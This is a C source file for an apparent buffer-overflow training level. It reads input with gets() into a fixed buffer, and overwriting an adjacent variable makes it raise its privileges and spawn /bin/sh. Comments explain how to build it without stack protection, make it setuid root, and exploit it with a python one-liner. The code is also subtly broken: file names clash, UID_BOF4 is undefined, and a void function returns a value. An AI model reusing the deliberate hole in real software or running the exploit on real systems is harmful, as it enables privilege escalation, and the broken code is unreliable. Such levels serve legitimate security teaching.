// AFTER => bof2.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x61
#define G "\033[32m"
#define E "\033[0m"
#define Y "\033[33m"

// ASLR OFF
// COMPILE $ gcc -fno-stack-protector bof3.c -o bof3
// SETUID  $ sudo chown root:root bof3
//         $ sudo chmod 4755 bof3
// EXPLOIT $ (python -c "print 'a\x00\x00\x00'+'x'*140";cat) | ./bof3

void vuln() {
    int innocent;
    char buf[BUF_SIZE];

    puts(G "enter your name :)" E);
    gets(buf);
    printf("Hello " Y "%s" E "!\n", buf);

    if (innocent  == KEY) {
        if (setreuid(UID_BOF4, UID_BOF4)) {
            perror("setuid");
            return 1;
        }
        if (setregid(UID_BOF4, UID_BOF4)) {
            perror("setgid");
            return 1;
        }
        system("/bin/sh");
    }
}

int main(){
    vuln();
    return 0;
}
